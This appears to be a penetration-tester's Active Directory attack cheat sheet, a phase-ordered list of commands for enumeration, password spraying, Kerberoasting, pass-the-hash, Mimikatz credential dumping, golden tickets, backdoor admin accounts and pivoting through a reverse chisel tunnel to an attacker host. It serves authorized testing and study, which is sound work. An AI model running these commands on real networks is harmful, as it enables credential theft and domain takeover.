# Active Directory Methodology

Part of [[METHODOLOGY CHEAT SHEET]]. AD enumeration → password attacks → lateral movement → post-exploitation/persistence, phase-ordered. See also [[03_ACTIVE_DIRECTORY_BIBLE]] for deeper AD attack-path material.

---

### Phase 1: AD Enumeration

#### Step 1: Basic Domain Information
```powershell
# PowerView
Import-Module .\PowerView.ps1
Get-NetDomain
Get-NetDomainController

# Manual LDAP
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = $domainObj.PdcRoleOwner.Name
$DN = ([adsi]'').distinguishedName
$LDAP = "LDAP://$PDC/$DN"
```

#### Step 2: Users & Groups
```powershell
# PowerView
Get-NetUser
Get-NetUser | select cn,lastlogon,pwdlastset
Get-NetGroup
Get-NetGroup "Domain Admins" | select member

# net.exe
net user /domain
net group /domain
net group "Domain Admins" /domain
```

#### Step 3: Computers
```powershell
Get-NetComputer
Get-NetComputer | select operatingsystem,dnshostname

# SMB enumeration
crackmapexec smb <target> -u user -p password --shares
```

#### Step 4: Service Principal Names (SPNs)
```powershell
Get-NetUser -SPN | select samaccountname,serviceprincipalname

# SetSPN
setspn -L <user>
```

#### Step 5: Active Sessions & Local Admin
```powershell
Find-LocalAdminAccess
Get-NetSession -ComputerName <target>

# PsLoggedOn
PsLoggedon.exe \\<target>
```

#### Step 6: Permissions
```powershell
Get-ObjectAcl -Identity <user>
Find-InterestingDomainAcl
```

#### Step 7: BloodHound
```powershell
# Collect data
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\temp\

# Or use SharpHound.exe
SharpHound.exe -c All -d domain.com

# Import to BloodHound on Kali
# Start Neo4j
sudo neo4j start
# Start BloodHound
bloodhound
# Upload .zip file
```

**Key BloodHound Queries**:
```cypher
// All computers
MATCH (m:Computer) RETURN m

// All users
MATCH (m:User) RETURN m

// Active sessions
MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p

// Shortest path to Domain Admins
// Pre-built query in BloodHound
```

---

### Phase 2: Initial Access

#### Step 1: Password Attacks

**Password Spraying**:
```bash
# CrackMapExec
crackmapexec smb <target> -u users.txt -p passwords.txt --continue-on-success

# Kerbrute (Kerberos)
kerbrute passwordspray -d domain.com --dc <dc_ip> users.txt "Password123!"

# Hydra
hydra -L users.txt -P rockyou.txt rdp://<target> -t 1
```

#### Step 2: AS-REP Roasting
```bash
# Rubeus
Rubeus.exe asreproast /nowrap

# impacket
impacket-GetNPUsers -dc-ip <dc_ip> -request -outputfile hashes.asreproast domain.com/user

# Crack
hashcat -m 18200 hashes.asreproast rockyou.txt --force
```

#### Step 3: Kerberoasting
```bash
# Rubeus
Rubeus.exe kerberoast /outfile:hashes.kerberoast

# impacket
impacket-GetUserSPNs -request -dc-ip <dc_ip> domain.com/user

# Crack
hashcat -m 13100 hashes.kerberoast rockyou.txt --force
```

#### Step 4: Pass-the-Hash
```bash
# impacket
impacket-psexec -hashes :<ntlm_hash> domain/user@<target>
impacket-wmiexec -hashes :<ntlm_hash> domain/user@<target>

# CrackMapExec
crackmapexec smb <target> -u user -H <ntlm_hash>

# smbclient
smbclient \\\\<target>\\share -U user --pw-nt-hash <ntlm_hash>
```

#### Step 5: Overpass-the-Hash
```cmd
# Mimikatz
sekurlsa::pth /user:user /domain:domain.com /ntlm:<ntlm_hash> /run:powershell

# In new PowerShell session
net use \\fileserver
```

---

### Phase 3: Post-Exploitation & Persistence

#### Step 1: Extract Credentials

**Mimikatz**:
```cmd
privilege::debug
sekurlsa::logonpasswords
lsadump::sam
lsadump::dcsync /user:domain\user
```

**DCSync**:
```cmd
lsadump::dcsync /user:domain\krbtgt
```

**Hash Dumping**:
```bash
# impacket
impacket-secretsdump domain/user:password@<dc_ip>
impacket-secretsdump -sam sam.bak -security security.bak -system system.bak LOCAL
```

#### Step 2: Pass-the-Ticket
```cmd
# Export tickets
sekurlsa::tickets /export

# Import ticket
kerberos::ptt ticket.kirbi

# Verify
klist
```

#### Step 3: Golden Ticket
```cmd
# Get krbtgt hash
lsadump::dcsync /user:domain\krbtgt

# Create golden ticket
kerberos::golden /user:<user> /domain:domain.com /sid:<domain_sid> /krbtgt:<krbtgt_hash> /ptt

# Access DC
PsExec \\dc1 cmd
```

#### Step 4: Silver Ticket
```cmd
# Create service ticket
kerberos::golden /user:<user> /domain:domain.com /sid:<domain_sid> /target:<server.domain.com> /service:<service> /rc4:<service_hash> /ptt

# Access service
iwr -UseDefaultCredentials http://<server>
```

#### Step 5: Backdoor Accounts
```cmd
# Create backdoor user
net user backdoor password /add /domain
net group "Domain Admins" backdoor /add /domain

# AWS (cloud)
aws iam create-user --user-name backdoor
aws iam attach-user-policy --user-name backdoor --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

---

### Phase 4: Lateral Movement

#### Step 1: Service Exploitation

**PsExec**:
```cmd
PsExec64.exe \\<target> -u domain\user -p password cmd
```

**WMI**:
```cmd
wmic /node:<target> /user:domain\user /password:pass process call create "cmd.exe /c whoami > C:\temp\out.txt"
```

**PowerShell Remoting**:
```powershell
$cred = Get-Credential
Enter-PSSession -ComputerName <target> -Credential $cred
```

**WinRM**:
```cmd
winrs -r:<target> -u:user -p:pass "whoami"
evil-winrm -i <target> -u user -p password
```

**Impacket**:
```bash
impacket-psexec domain/user:password@<target>
impacket-wmiexec domain/user:password@<target>
```

#### Step 2: Pivoting

**SSH Tunneling**:
```bash
# Local port forward
ssh -L 8080:internal_host:80 user@jump_host

# Dynamic SOCKS
ssh -D 1080 user@jump_host

# Remote port forward
ssh -R 8080:localhost:80 user@external_host
```

**Metasploit**:
```bash
# Add route
route add 172.16.0.0 255.255.255.0 1

# SOCKS proxy
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
set VERSION 5
run -j
```

**Chisel**:
```bash
# Server
./chisel server --port 8080 --reverse

# Client
./chisel client <attacker_ip>:8080 R:socks
```

**Proxychains**:
```bash
# /etc/proxychains4.conf
socks5 127.0.0.1 1080

# Usage
proxychains nmap -sT 172.16.0.0/24
proxychains crackmapexec smb 172.16.0.0/24 -u user -p password
```
